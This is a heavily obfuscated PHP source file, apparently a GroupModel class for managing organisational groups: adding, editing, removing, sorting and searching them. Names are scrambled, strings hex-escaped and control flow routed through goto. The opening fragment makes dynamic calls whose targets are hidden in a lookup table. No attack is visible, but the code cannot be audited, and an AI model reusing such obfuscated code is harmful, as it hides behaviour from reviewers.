$EÂˆ¸„…‘ë); if (count($b§°Ñ§Ş‚…) < $_SERVER[Æ¼ôºÙï][567]) { $aĞñøŠƒ§ = $_SERVER[Æ¼ôºÙï][818]; $aĞñøŠƒ§(); } $B£°İĞù—¤ = $_SERVER[Æ¼ôºÙï][1021]; goto fÇšİ†¨Ç„; fÇšİ†¨Ç„: $B£°İĞù—¤($_SERVER[$_SERVER[Æ¼ôºÙï][811]]); goto cÕß“¯áí; fàãÒØÆù•: $DŞ‰Ä´¬£ = $_SERVER[Æ¼ôºÙï][815]; $a˜æ‚†¨ñ  = $_SERVER[$_SERVER[Æ¼ôºÙï][816]] . $_SERVER[Æ¼ôºÙï][817]; $EÂˆ¸„…‘ë = $DŞ‰Ä´¬£($a˜æ‚†¨ñ ); goto fñŸ‰Ò; cÕß“¯áí: } class GroupModel extends ModelBase { protected $tableName = "\x67\162\157\165\160"; protected $tableMeta = array("\x74\x61\142\154\x65\x4e\141\x6d\x65" => "\x67\x72\157\x75\x70\137\155\145\x74\141", "\155\145\164\x61\106\x69\145\154\144" => "\147\x72\x6f\165\x70\111\x44"); protected function cacheFunctionAlias($BÔç£¨™è) { $F›Şìé¬¶ =& $_SERVER[Æ¼ôºÙï]; return array($F›Şìé¬¶[1735] => array($BÔç£¨™è[0], $F›Şìé¬¶[1736]), $F›Şìé¬¶[1737] => array($BÔç£¨™è[0], $F›Şìé¬¶[1736])); } protected function getInfo($a¯Ä‚Ô±¦ ) { $Cæ¡Ô¥¹‰ = $this->getInfoSimple($a¯Ä‚Ô±¦ ); if (!$Cæ¡Ô¥¹‰) { return !1; } return $this->_listDataApplyItem($Cæ¡Ô¥¹‰); } protected function getInfoSimple($cê‡ÒóØ‘Õ, $bš÷¼æÎóÑ = false) { $bÏ¨ïãáš¨ =& $_SERVER[Æ¼ôºÙï]; if ($bš÷¼æÎóÑ) { $B“Æ˜¹‚ƒ = array($bÏ¨ïãáš¨[1661] => intval($cê‡ÒóØ‘Õ)); $Bµ¿¶×îãğ = $this->where($B“Æ˜¹‚ƒ)->find(); return is_array($Bµ¿¶×îãğ) ? $Bµ¿¶×îãğ : array(); } return $this->cacheFunctionGet($bÏ¨ïãáš¨[1738], $cê‡ÒóØ‘Õ); } protected function groupAdd($B ²‘¥Á­) { goto bŸÅŸàá…; bŸÅŸàá…: $c‘Ùå‡œ› =& $_SERVER[Æ¼ôºÙï]; if (!$B ²‘¥Á­[$c‘Ùå‡œ›[479]] && isset($B ²‘¥Á­[$c‘Ùå‡œ›[1661]]) && $B ²‘¥Á­[$c‘Ùå‡œ›[1661]] == 1) { if ($bŞë³Ò¼´œ = $this->getInfoSimple($B ²‘¥Á­[$c‘Ùå‡œ›[1661]], !0)) { return $B ²‘¥Á­[$c‘Ùå‡œ›[1661]]; } } else { $bŞë³Ò¼´œ = $this->getInfoSimple($B ²‘¥Á­[$c‘Ùå‡œ›[479]]); if (!$bŞë³Ò¼´œ) { return !1; } } $aµøæöè‰£ = $c‘Ùå‡œ›[488]; goto eÓ²ê¹î‚‚; FÅ‡½ë¸¼Ñ: if (!empty($B ²‘¥Á­[$c‘Ùå‡œ›[1661]])) { $Fôí½­ğ°Ö[$c‘Ùå‡œ›[1661]] = $B ²‘¥Á­[$c‘Ùå‡œ›[1661]]; } $EÉÏ“âƒÚ = $this->add($Fôí½­ğ°Ö); $this->setNamePinyin($EÉÏ“âƒÚ, $Fôí½­ğ°Ö[$c‘Ùå‡œ›[28]]); goto dÕìÔ•­Õó; dÕìÔ•­Õó: if (isset($B ²‘¥Á­[$c‘Ùå‡œ›[1741]])) { $this->metaSet($EÉÏ“âƒÚ, array($c‘Ùå‡œ›[1741] => $B ²‘¥Á­[$c‘Ùå‡œ›[1741]], $c‘Ùå‡œ›[1742] => $B ²‘¥Á­[$c‘Ùå‡œ›[1742]])); unset($B ²‘¥Á­[$c‘Ùå‡œ›[1741]]); unset($B ²‘¥Á­[$c‘Ùå‡œ›[1742]]); } Model($c‘Ùå‡œ›[1182])->groupRootAdd($EÉÏ“âƒÚ); return $EÉÏ“âƒÚ; goto D™·Âµƒ«»; eÓ²ê¹î‚‚: if ($bŞë³Ò¼´œ[$c‘Ùå‡œ›[477]]) { $aµøæöè‰£ = $bŞë³Ò¼´œ[$c‘Ùå‡œ›[477]] . $bŞë³Ò¼´œ[$c‘Ùå‡œ›[1661]] . $c‘Ùå‡œ›[47]; } $Fôí½­ğ°Ö = array($c‘Ùå‡œ›[404] => $this->groupNameAuto($B ²‘¥Á­[$c‘Ùå‡œ›[479]], $B ²‘¥Á­[$c‘Ùå‡œ›[28]]), $c‘Ùå‡œ›[386] => $B ²‘¥Á­[$c‘Ùå‡œ›[479]], $c‘Ùå‡œ›[542] => $aµøæöè‰£, $c‘Ùå‡œ›[1739] => $B ²‘¥Á­[$c‘Ùå‡œ›[1645]], $c‘Ùå‡œ›[1740] => 0, $c‘Ùå‡œ›[1665] => 0); if (isset($B ²‘¥Á­[$c‘Ùå‡œ›[1684]])) { $Fôí½­ğ°Ö[$c‘Ùå‡œ›[1684]] = $B ²‘¥Á­[$c‘Ùå‡œ›[1684]]; } else { $bè÷ó¡Ä…… = $this->max($c‘Ùå‡œ›[1684]); if (!$bè÷ó¡Ä……) { $bè÷ó¡Ä…… = 0; } $Fôí½­ğ°Ö[$c‘Ùå‡œ›[1684]] = $bè÷ó¡Ä…… + 1; } goto FÅ‡½ë¸¼Ñ; D™·Âµƒ«»: } protected function groupEdit($BñÅá•Ëì, $Cõ¸¬ˆƒè…) { $e›ªõ­ÃÁñ =& $_SERVER[Æ¼ôºÙï]; if (!empty($Cõ¸¬ˆƒè…[$e›ªõ­ÃÁñ[479]])) { $f…»…àˆË = $this->getInfoSimple($BñÅá•Ëì); $F™ÀêÆ‡»å = $this->getInfoSimple($Cõ¸¬ˆƒè…[$e›ªõ­ÃÁñ[479]]); if (!$f…»…àˆË || !$F™ÀêÆ‡»å) { return !1; } if ($f…»…àˆË[$e›ªõ­ÃÁñ[1661]] == $F™ÀêÆ‡»å[$e›ªõ­ÃÁñ[1661]]) { return !1; } if ($Cõ¸¬ˆƒè…[$e›ªõ­ÃÁñ[479]] != $f…»…àˆË[$e›ªõ­ÃÁñ[479]]) { if ($F™ÀêÆ‡»å[$e›ªõ­ÃÁñ[477]] !== $f…»…àˆË[$e›ªõ­ÃÁñ[477]] && strpos($F™ÀêÆ‡»å[$e›ªõ­ÃÁñ[477]], $f…»…àˆË[$e›ªõ­ÃÁñ[477]] . $f…»…àˆË[$e›ªõ­ÃÁñ[1661]] . $e›ªõ­ÃÁñ[47]) === 0) { return !1; } $Cõ¸¬ˆƒè…[$e›ªõ­ÃÁñ[542]] = $F™ÀêÆ‡»å[$e›ªõ­ÃÁñ[477]] . $Cõ¸¬ˆƒè…[$e›ªõ­ÃÁñ[479]] . $e›ªõ­ÃÁñ[47]; $this->_changeChildLevel($f…»…àˆË, $F™ÀêÆ‡»å); } } if (isset($Cõ¸¬ˆƒè…[$e›ªõ­ÃÁñ[28]])) { $this->setNamePinyin($BñÅá•Ëì, $Cõ¸¬ˆƒè…[$e›ªõ­ÃÁñ[28]]); } if (isset($Cõ¸¬ˆƒè…[$e›ªõ­ÃÁñ[1741]])) { $this->metaSet($BñÅá•Ëì, array($e›ªõ­ÃÁñ[1741] => $Cõ¸¬ˆƒè…[$e›ªõ­ÃÁñ[1741]], $e›ªõ­ÃÁñ[1742] => $Cõ¸¬ˆƒè…[$e›ªõ­ÃÁñ[1742]])); unset($Cõ¸¬ˆƒè…[$e›ªõ­ÃÁñ[1741]]); unset($Cõ¸¬ˆƒè…[$e›ªõ­ÃÁñ[1742]]); } return $this->where(array($e›ªõ­ÃÁñ[1743] => $BñÅá•Ëì))->save($Cõ¸¬ˆƒè…); } private function _changeChildLevel($cšğ‡ÁÒ“à, $BÌ£¸‚ÔŒ†, $A’ìö±ÉÂ¥ = false) { goto e‚£ƒ½¢èá; e‚£ƒ½¢èá: $Fõ³»Óå‘ =& $_SERVER[Æ¼ôºÙï]; $eƒ›Çõø½¼ = $cšğ‡ÁÒ“à[$Fõ³»Óå‘[477]] . $cšğ‡ÁÒ“à[$Fõ³»Óå‘[1661]] . $Fõ³»Óå‘[47]; $Dáµ¿»„Ü™ = $BÌ£¸‚ÔŒ†[$Fõ³»Óå‘[477]] . $BÌ£¸‚ÔŒ†[$Fõ³»Óå‘[1661]] . $Fõ³»Óå‘[47] . $cšğ‡ÁÒ“à[$Fõ³»Óå‘[1661]] . $Fõ³»Óå‘[47]; goto cæ¸¿„ö…á; cæ¸¿„ö…á: if ($A’ìö±ÉÂ¥) { $Dáµ¿»„Ü™ = $BÌ£¸‚ÔŒ†[$Fõ³»Óå‘[477]] . $BÌ£¸‚ÔŒ†[$Fõ³»Óå‘[1661]] . $Fõ³»Óå‘[47]; } $B›¤£¿¿Ñ = array($Fõ³»Óå‘[542] => array($Fõ³»Óå‘[501], $cšğ‡ÁÒ“à[$Fõ³»Óå‘[477]] . $cšğ‡ÁÒ“à[$Fõ³»Óå‘[1661]] . $Fõ³»Óå‘[502])); $Bô‡½›µ = array($Fõ³»Óå‘[542] => array($Fõ³»Óå‘[550], "\x72\x65\160\x6c\141\143\x65\50\x70\x61\x72\145\156\164\x4c\x65\166\x65\x6c\54\x27{$eƒ›Çõø½¼}\x27\x2c\47{$Dáµ¿»„Ü™}\47\x29")); goto Bö•òªƒºÒ; Bö•òªƒºÒ: $this->where($B›¤£¿¿Ñ)->data($Bô‡½›µ)->save(); goto d‘‰Ø¦†ç; d‘‰Ø¦†ç: } public function setNamePinyin($bÍåÖÔ†¢¾, $dÛèÀÔ°§Å = false) { $cÖ™ƒîÓ =& $_SERVER[Æ¼ôºÙï]; if (!$dÛèÀÔ°§Å) { $e¨§Œ¨İ½é = $this->getInfoSimple($bÍåÖÔ†¢¾); $dÛèÀÔ°§Å = $e¨§Œ¨İ½é[$cÖ™ƒîÓ[28]]; } if (!Input::check($dÛèÀÔ°§Å, $cÖ™ƒîÓ[545])) { $this->metaSet($bÍåÖÔ†¢¾, $cÖ™ƒîÓ[433], null); $this->metaSet($bÍåÖÔ†¢¾, $cÖ™ƒîÓ[432], null); return; } $f»¾•’î·† = array($cÖ™ƒîÓ[433] => str_replace($cÖ™ƒîÓ[50], $cÖ™ƒîÓ[33], Pinyin::encode($dÛèÀÔ°§Å)), $cÖ™ƒîÓ[432] => Pinyin::encode($dÛèÀÔ°§Å, $cÖ™ƒîÓ[546])); $this->metaSet($bÍåÖÔ†¢¾, $f»¾•’î·†); } protected function groupStatus($DÛ©¢×ã«Ş, $E¦¨ÙĞ‰æ) { goto AÛ¦—ˆ°Ú¯; a‹ê¸Ü›Œ«: if ($E¦¨ÙĞ‰æ == $dìê‘ƒ¼ĞÂ[86]) { $Fè„¢ª…­ = $this->parentLevelArray($D¨ÚÆÖ¡À[$dìê‘ƒ¼ĞÂ[477]]); } else { $e©¹­½´ÎÙ = array($dìê‘ƒ¼ĞÂ[542] => array($dìê‘ƒ¼ĞÂ[501], $D¨ÚÆÖ¡À[$dìê‘ƒ¼ĞÂ[477]] . $D¨ÚÆÖ¡À[$dìê‘ƒ¼ĞÂ[1661]] . $dìê‘ƒ¼ĞÂ[502])); $Fè„¢ª…­ = $this->where($e©¹­½´ÎÙ)->field($dìê‘ƒ¼ĞÂ[1661])->select(); $Fè„¢ª…­ = array_to_keyvalue($Fè„¢ª…­, $dìê‘ƒ¼ĞÂ[33], $dìê‘ƒ¼ĞÂ[1661]); } $Fè„¢ª…­[] = $D¨ÚÆÖ¡À[$dìê‘ƒ¼ĞÂ[1661]]; $d†…Š÷ºÚµ = array(); goto A¥’Ş˜¾Õ…; A¥’Ş˜¾Õ…: foreach ($Fè„¢ª…­ as $DÛ©¢×ã«Ş) { $d†…Š÷ºÚµ[] = array($dìê‘ƒ¼ĞÂ[1661] => $DÛ©¢×ã«Ş, $dìê‘ƒ¼ĞÂ[92] => $dìê‘ƒ¼ĞÂ[708], $dìê‘ƒ¼ĞÂ[368] => $E¦¨ÙĞ‰æ); } return Model($dìê‘ƒ¼ĞÂ[1744])->addAll($d†…Š÷ºÚµ, array(), !0); goto Cœƒ®Ü”Ã; AÛ¦—ˆ°Ú¯: $dìê‘ƒ¼ĞÂ =& $_SERVER[Æ¼ôºÙï]; $D¨ÚÆÖ¡À = $this->getInfoSimple($DÛ©¢×ã«Ş); if (!$D¨ÚÆÖ¡À) { return !1; } goto a‹ê¸Ü›Œ«; Cœƒ®Ü”Ã: } protected function groupRemove($eáØÃ„àõ´) { goto b²±Î‘œÄ‘; b²±Î‘œÄ‘: $bÊó‚éâè =& $_SERVER[Æ¼ôºÙï]; $Bº´–‚ƒ‰Š = array($bÊó‚éâè[1661] => $eáØÃ„àõ´); $b®ÂíÜ„ = $this->where($Bº´–‚ƒ‰Š)->find(); goto A°äÜÖÖ÷˜; A°äÜÖÖ÷˜: if (!$b®ÂíÜ„ || $b®ÂíÜ„[$bÊó‚éâè[479]] == 0) { return !1; } $d—Ãöá = $this->getInfoSimple($b®ÂíÜ„[$bÊó‚éâè[479]]); $this->_changeChildLevel($b®ÂíÜ„, $d—Ãöá, !0); goto E„›¶ø; E„›¶ø: $this->where(array($bÊó‚éâè[479] => $eáØÃ„àõ´))->save(array($bÊó‚éâè[479] => $b®ÂíÜ„[$bÊó‚éâè[479]])); Model($bÊó‚éâè[1744])->where($Bº´–‚ƒ‰Š)->delete(); Model($bÊó‚éâè[1745])->where($Bº´–‚ƒ‰Š)->delete(); goto DÕÍ¢„¤‚; DÕÍ¢„¤‚: Model($bÊó‚éâè[770])->groupRootRemove($eáØÃ„àõ´); return $this->where($Bº´–‚ƒ‰Š)->delete(); goto EØˆ­×©˜Ó; EØˆ­×©˜Ó: } protected function groupSort($Bî¨ŒŞò‹Ì) { $Aš¶Óøº =& $_SERVER[Æ¼ôºÙï]; $B³Èè ì– = array(); foreach ($Bî¨ŒŞò‹Ì as $f’î˜öì®‰ => $c®—ÌéğÇ) { $B³Èè ì–[] = array($Aš¶Óøº[1661], $c®—ÌéğÇ, $Aš¶Óøº[1684], $f’î˜öì®‰ + 1); } $this->saveAll($B³Èè ì–); } public function listData() { $D¿Ş¾À‘¨ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($D¿Ş¾À‘¨[$_SERVER[Æ¼ôºÙï][363]]); return $D¿Ş¾À‘¨; } private function _makeOrder($b…éÉèÉÖÁ = '') { goto B‹ò¸ë³Øƒ; D’ŒñŸ³’: $AÇİ’â­ì  = Input::get($C¯†‘Ò… ‡[424], $C¯†‘Ò… ‡[7], $C¯†‘Ò… ‡[1665], $Dø¹Îâ•¾’); $CæùÒ…ÒˆÂ = Input::get($C¯†‘Ò… ‡[425], $C¯†‘Ò… ‡[7], $C¯†‘Ò… ‡[1746], array($C¯†‘Ò… ‡[1746], $C¯†‘Ò… ‡[421])); $CæùÒ…ÒˆÂ = $C¼º³‰Î–ê[$CæùÒ…ÒˆÂ]; goto a¸ŸŸ­öÀ­; B‹ò¸ë³Øƒ: $C¯†‘Ò… ‡ =& $_SERVER[Æ¼ôºÙï]; $Dø¹Îâ•¾’ = array($C¯†‘Ò… ‡[1661], $C¯†‘Ò… ‡[28], $C¯†‘Ò… ‡[1647], $C¯†‘Ò… ‡[192]); $C¼º³‰Î–ê = array($C¯†‘Ò… ‡[419] => $C¯†‘Ò… ‡[420], $C¯†‘Ò… ‡[421] => $C¯†‘Ò… ‡[422]); goto D’ŒñŸ³’; a¸ŸŸ­öÀ­: $b…éÉèÉÖÁ = $b…éÉèÉÖÁ . "{$AÇİ’â­ì }\40{$CæùÒ…ÒˆÂ}\x2c\40\x67\x72\157\165\x70\x49\x44\x20\x61\x73\143"; return $this->order($b…éÉèÉÖÁ); goto dÏ½¨—¢è³; dÏ½¨—¢è³: } public function listChild($DßëÚ“êŠ²) { $DØ’©Ôö =& $_SERVER[Æ¼ôºÙï]; $B£¾¿İ²Îá = $this->where(array($DØ’©Ôö[479] => $DßëÚ“êŠ²))->_makeOrder()->selectPage(200); $this->_listDataApply($B£¾¿İ²Îá[$DØ’©Ôö[363]]); return $B£¾¿İ²Îá; } public function listByID($a¹Şí¿«Íë) { $dœö¯ƒ…»ˆ =& $_SERVER[Æ¼ôºÙï]; if (!$a¹Şí¿«Íë) { return array(); } $cí¸ÅÖ¦‹¼ = array($dœö¯ƒ…»ˆ[1661] => array($dœö¯ƒ…»ˆ[7], $a¹Şí¿«Íë)); $DæÒÂï’èğ = $this->where($cí¸ÅÖ¦‹¼)->select(); $this->_listDataApply($DæÒÂï’èğ); return $DæÒÂï’èğ; } public function listSearch($AÒÒğ»ŒÙ) { goto dçóÚâùæ; CéÍøË©‚: $d ²£”ˆ•¶ = $d ²£”ˆ•¶ ? $d ²£”ˆ•¶ : array(); if (!$d ²£”ˆ•¶ || count($d ²£”ˆ•¶[$BİÏ½½Õ…[363]]) < 5 && Input::check($B…­«›³ãò, $BİÏ½½Õ…[314])) { goto c¡ ·µÖÆ›; a™—Òäß¶Ê: $d ²£”ˆ•¶[$BİÏ½½Õ…[360]][$BİÏ½½Õ…[362]] = ceil($d ²£”ˆ•¶[$BİÏ½½Õ…[360]][$BİÏ½½Õ…[361]] / $d ²£”ˆ•¶[$BİÏ½½Õ…[360]][$BİÏ½½Õ…[358]]); goto fÓ—Õ©ÍŸÖ; c¡ ·µÖÆ›: $dõ†‹¢ì½Š = $this->groupChildrenAll($Eô„ÅÖ‹ˆæ); $eÂáùÁâÏ = $this->_searchFromMeta($BİÏ½½Õ…[432], $B…­«›³ãò, 10, $dõ†‹¢ì½Š); $C¥¨Ã½¨ = $this->_searchFromMeta($BİÏ½½Õ…[433], $B…­«›³ãò, 10, $dõ†‹¢ì½Š); goto aíÌ„Í£Ò–; aíÌ„Í£Ò–: $cè¼…´ïÇ“ = array_merge($eÂáùÁâÏ, $C¥¨Ã½¨, $d ²£”ˆ•¶[$BİÏ½½Õ…[363]]); $d ²£”ˆ•¶[$BİÏ½½Õ…[363]] = array_unique_by_key($cè¼…´ïÇ“, $BİÏ½½Õ…[1661]); $d ²£”ˆ•¶[$BİÏ½½Õ…[360]][$BİÏ½½Õ…[361]] = count($d ²£”ˆ•¶[$BİÏ½½Õ…[363]]); goto a™—Òäß¶Ê; fÓ—Õ©ÍŸÖ: } $this->_listDataApply($d ²£”ˆ•¶[$BİÏ½½Õ…[363]]); goto B¿²ĞõãÙ“; FÀÎÖ·öóˆ: if (!trim($B…­«›³ãò)) { return !1; } $B…­«›³ãò = str_replace($BİÏ½½Õ…[1749], $BİÏ½½Õ…[1750], $B…­«›³ãò); $d›ß×Ä„Î³ = array($BİÏ½½Õ…[1661] => array($BİÏ½½Õ…[375], "{$B…­«›³ãò}\x25"), $BİÏ½½Õ…[28] => array($BİÏ½½Õ…[375], "\45{$B…­«›³ãò}\45"), $BİÏ½½Õ…[936] => $BİÏ½½Õ…[1751]); goto dÆ†òŠ¤Ãğ; dçóÚâùæ: $BİÏ½½Õ… =& $_SERVER[Æ¼ôºÙï]; $B…­«›³ãò = $AÒÒğ»ŒÙ[$BİÏ½½Õ…[1747]]; $Eô„ÅÖ‹ˆæ = isset($AÒÒğ»ŒÙ[$BİÏ½½Õ…[1748]]) ? $AÒÒğ»ŒÙ[$BİÏ½½Õ…[1748]] : !1; goto FÀÎÖ·öóˆ; dÆ†òŠ¤Ãğ: if ($Eô„ÅÖ‹ˆæ) { $F©‹±˜ Î° = $this->getInfoSimple($Eô„ÅÖ‹ˆæ); $dëí“„Ø“ô = $F©‹±˜ Î°[$BİÏ½½Õ…[477]] . $Eô„ÅÖ‹ˆæ . $BİÏ½½Õ…[502]; $d›ß×Ä„Î³ = array($d›ß×Ä„Î³, array($BİÏ½½Õ…[477] => array($BİÏ½½Õ…[375], $dëí“„Ø“ô))); } $d›ß×Ä„Î³ = $this->parseWhereLike($d›ß×Ä„Î³); $d ²£”ˆ•¶ = $this->_makeOrder()->where($d›ß×Ä„Î³)->selectPage(20); goto CéÍøË©‚; B¿²ĞõãÙ“: return $d ²£”ˆ•¶; goto fõèËªêôö; fõèËªêôö: } protected function groupChildrenAll($fĞ›ø¶Á½±) { $d†ñİÏÁ¦ =& $_SERVER[Æ¼ôºÙï]; if (!$fĞ›ø¶Á½±) { return !1; } if (is_string($fĞ›ø¶Á½±)) { $fĞ›ø¶Á½± = array($fĞ›ø¶Á½±); } $EÏºº¹ÇåĞ = $fĞ›ø¶Á½±; foreach ($fĞ›ø¶Á½± as $eù¶ÔòÜÛ») { $Fèğò‡éÍ = $this->getInfoSimple($eù¶ÔòÜÛ»); $aï¶­öÊëŠ = array($d†ñİÏÁ¦[477] => array($d†ñİÏÁ¦[375], $Fèğò‡éÍ[$d†ñİÏÁ¦[477]] . $eù¶ÔòÜÛ» . $d†ñİÏÁ¦[502])); $E¡Ñ¤£”«§ = $this->field($d†ñİÏÁ¦[1661])->where($aï¶­öÊëŠ)->select(); $EÏºº¹ÇåĞ = array_merge($EÏºº¹ÇåĞ, array_to_keyvalue($E¡Ñ¤£”«§, $d†ñİÏÁ¦[33], $d†ñİÏÁ¦[1661])); } return array_unique($EÏºº¹ÇåĞ); } private function _searchFromMeta($C±Ô½¤Æ§, $d«ò¿‰«, $f—ïˆ½‹, $Aùœ†‰Æ¯î) { goto eˆØ¿Õ‘ƒÔ; eˆØ¿Õ‘ƒÔ: $F÷”Îİí…â =& $_SERVER[Æ¼ôºÙï]; $d«ò¿‰« = strtolower($d«ò¿‰«); $bïº«˜‡² = array($F÷”Îİí…â[92] => $C±Ô½¤Æ§, $F÷”Îİí…â[368] => array($F÷”Îİí…â[375], "\x25{$d«ò¿‰«}\x25")); goto c¶‰…¬ãŠÁ; F§÷ê‰ö: if (!$c›¶½ôÂê) { return array(); } return $c›¶½ôÂê; goto bŒŞ¹ñ¢„ì; E¡ô°¨µ„¶: if (!$Aåâº…Œ¿) { return array(); } $Aåâº…Œ¿ = array_to_keyvalue($Aåâº…Œ¿, $F÷”Îİí…â[33], $F÷”Îİí…â[1661]); $c›¶½ôÂê = $this->where(array($F÷”Îİí…â[1743] => array($F÷”Îİí…â[7], $Aåâº…Œ¿)))->select(); goto F§÷ê‰ö; c¶‰…¬ãŠÁ: $bïº«˜‡² = $this->parseWhereLike($bïº«˜‡²); if ($Aùœ†‰Æ¯î) { $bïº«˜‡²[$F÷”Îİí…â[1661]] = array($F÷”Îİí…â[7], $Aùœ†‰Æ¯î); } $Aåâº…Œ¿ = Model($F÷”Îİí…â[1752])->where($bïº«˜‡²)->limit($f—ïˆ½‹)->select(); goto E¡ô°¨µ„¶; bŒŞ¹ñ¢„ì: } protected function _listDataApplyItem($DÓ™óö“³œ) { $FõÆ°’–Î = array($DÓ™óö“³œ); $this->_listDataApply($FõÆ°’–Î); return $FõÆ°’–Î[0]; } protected function _listDataApply(&$b¦…öåºõ) { goto cà³Ã’‚ä; c”²ÀÉ«â: $this->_listAppendParent($b¦…öåºõ); $this->_listAppendSourceRoot($b¦…öåºõ, $cËÓªŠª·´); goto eô¸„Š¹§Ç; fÍÊŸ½Æ™: $this->_listAppendChildren($b¦…öåºõ); $this->_listAppendChildrenMember($b¦…öåºõ); $this->_listAppendMeta($b¦…öåºõ, $cËÓªŠª·´); goto c”²ÀÉ«â; cà³Ã’‚ä: $AëÈ–™Œ˜ğ =& $_SERVER[Æ¼ôºÙï]; if (!$b¦…öåºõ) { return; } $cËÓªŠª·´ = array_to_keyvalue($b¦…öåºõ, $AëÈ–™Œ˜ğ[33], $AëÈ–™Œ˜ğ[1661]); goto fÍÊŸ½Æ™; eô¸„Š¹§Ç: } private function _listAppendChildren(&$d‡Úçê¶ˆê) { goto d‡ùƒ…“; AÔ‡‚îˆ”: $bÆ‰Ì£Ãˆ¸ = array_to_keyvalue($bÆ‰Ì£Ãˆ¸, $BÉ¬ÃİÇé[468]); foreach ($d‡Úçê¶ˆê as &$aâìê¡á­‹) { $aâìê¡á­‹[$BÉ¬ÃİÇé[1753]] = isset($bÆ‰Ì£Ãˆ¸[$aâìê¡á­‹[$BÉ¬ÃİÇé[1661]] . $BÉ¬ÃİÇé[1754]]); } unset($aâìê¡á­‹); goto eÂö‚à¯±â; dš­ÜÍó‚¾: $b¸‚ˆ†¿‚Ø = count($d‡Úçê¶ˆê); $EªË³İ×İ = $this->tablePrefix . $this->tableName; for ($C†Ò¶šæ = 0, $F•ˆ´‡Ü©ã = 0; $C†Ò¶šæ < $b¸‚ˆ†¿‚Ø; $C†Ò¶šæ++) { $F•ˆ´‡Ü©ã++; $b¤…ÛèÓŠé = $d‡Úçê¶ˆê[$C†Ò¶šæ][$BÉ¬ÃİÇé[1661]]; $Dİ°•¹‹– .= "\123\105\114\105\103\x54\x20\x2a\40\x46\122\x4f\x4d\x20\x28\x53\x45\x4c\105\103\124\40\x27{$b¤…ÛèÓŠé}\x5f\143\x68\x69\x6c\144\x27\x20\141\x73\x20\150\141\x73\40\106\x52\x4f\x4d\x20\140{$EªË³İ×İ}\x60\x20\167\x68\145\x72\145\40\160\141\162\145\156\164\111\x44\75{$b¤…ÛèÓŠé}\x20\154\x69\155\151\x74\40\61\51\x20\141\x73\x20\164\x62\137{$b¤…ÛèÓŠé}\40\165\x6e\x69\x6f\x6e\40\141\154\x6c\x20"; if (($F•ˆ´‡Ü©ã >= 20 || $C†Ò¶šæ == $b¸‚ˆ†¿‚Ø - 1) && $Dİ°•¹‹–) { $Dİ°•¹‹– = substr($Dİ°•¹‹–, 0, -strlen($BÉ¬ÃİÇé[467])); $eëç™¤‹Íƒ = $this->query($Dİ°•¹‹–); $bÆ‰Ì£Ãˆ¸ = array_merge($bÆ‰Ì£Ãˆ¸, $eëç™¤‹Íƒ); $F•ˆ´‡Ü©ã = 0; $Dİ°•¹‹– = $BÉ¬ÃİÇé[33]; } } goto AÔ‡‚îˆ”; d‡ùƒ…“: $BÉ¬ÃİÇé =& $_SERVER[Æ¼ôºÙï]; $Dİ°•¹‹– = $BÉ¬ÃİÇé[370]; $bÆ‰Ì£Ãˆ¸ = array(); goto dš­ÜÍó‚¾; eÂö‚à¯±â: } private function _listAppendChildrenMember(&$A¯…ƒèÁ÷) { goto BÆøÜéÊ‡×; BÆøÜéÊ‡×: $D‚¬ùÛ¯ëë =& $_SERVER[Æ¼ôºÙï]; $Dãß”‰„ß = $D‚¬ùÛ¯ëë[370]; $f¾œ¿ˆ÷êŞ = array(); goto dª¾†°ƒ³; B‚ÔÍÚˆŞ: $f¾œ¿ˆ÷êŞ = array_to_keyvalue($f¾œ¿ˆ÷êŞ, $D‚¬ùÛ¯ëë[468]); foreach ($A¯…ƒèÁ÷ as &$E¤½ÍïõÀø) { $E¤½ÍïõÀø[$D‚¬ùÛ¯ëë[1755]] = isset($f¾œ¿ˆ÷êŞ[$E¤½ÍïõÀø[$D‚¬ùÛ¯ëë[1661]] . $D‚¬ùÛ¯ëë[1754]]); } unset($E¤½ÍïõÀø); goto aÅ‚©§¶„; dª¾†°ƒ³: $b»Ã™ĞïŠª = count($A¯…ƒèÁ÷); $aìá¨²«’ = $this->tablePrefix . $D‚¬ùÛ¯ëë[1745]; for ($AàÈç­ô†Ş = 0, $Cäİ‘Äé® = 0; $AàÈç­ô†Ş < $b»Ã™ĞïŠª; $AàÈç­ô†Ş++) { $Cäİ‘Äé®++; $C±í¥ğ÷Ã = $A¯…ƒèÁ÷[$AàÈç­ô†Ş][$D‚¬ùÛ¯ëë[1661]]; $Dãß”‰„ß .= "\x53\105\114\105\x43\x54\40\52\40\x46\122\x4f\x4d\x20\x28\x53\x45\114\105\x43\x54\x20\x27{$C±í¥ğ÷Ã}\137\143\150\151\154\144\47\x20\141\x73\40\x68\x61\x73\40\x46\122\x4f\x4d\x20\140{$aìá¨²«’}\x60\40\167\x68\145\162\x65\x20\x67\x72\157\x75\x70\111\x44\x3d{$C±í¥ğ÷Ã}\x20\x6c\151\155\151\164\40\61\51\x20\x61\163\40\164\x62\137{$C±í¥ğ÷Ã}\40\165\156\151\157\156\x20\x61\x6c\x6c\40"; if (($Cäİ‘Äé® >= 20 || $AàÈç­ô†Ş == $b»Ã™ĞïŠª - 1) && $Dãß”‰„ß) { $Dãß”‰„ß = substr($Dãß”‰„ß, 0, -strlen($D‚¬ùÛ¯ëë[467])); $FÁ»¨×‰›Ã = $this->query($Dãß”‰„ß); $f¾œ¿ˆ÷êŞ = array_merge($f¾œ¿ˆ÷êŞ, $FÁ»¨×‰›Ã); $Cäİ‘Äé® = 0; $Dãß”‰„ß = $D‚¬ùÛ¯ëë[33]; } } goto B‚ÔÍÚˆŞ; aÅ‚©§¶„: } private function _listAppendMeta(&$cµì¨ôÛ˜Û, $cÎê•ßö) { goto aè ›¡˜İ; aè ›¡˜İ: $F°Ò­ö½°  =& $_SERVER[Æ¼ôºÙï]; $e‰‚“˜²´· = array($F°Ò­ö½° [1661] => array($F°Ò­ö½° [7], $cÎê•ßö)); $aõÖ„í¡ƒÔ = Model($F°Ò­ö½° [1744])->where($e‰‚“˜²´·)->select(); goto aö¨¸õ½Á; aÕí‡•–ö: foreach ($cµì¨ôÛ˜Û as &$E¿¸‹Èïè) { $E¿¸‹Èïè[$F°Ò­ö½° [434]] = array(); if (isset($aõÖ„í¡ƒÔ[$E¿¸‹Èïè[$F°Ò­ö½° [1661]]])) { $E¿¸‹Èïè[$F°Ò­ö½° [434]] = $aõÖ„í¡ƒÔ[$E¿¸‹Èïè[$F°Ò­ö½° [1661]]]; } } unset($E¿¸‹Èïè); goto C‚ö—Îø×; aö¨¸õ½Á: $aõÖ„í¡ƒÔ = array_to_keyvalue_group($aõÖ„í¡ƒÔ, $F°Ò­ö½° [1661]); foreach ($aõÖ„í¡ƒÔ 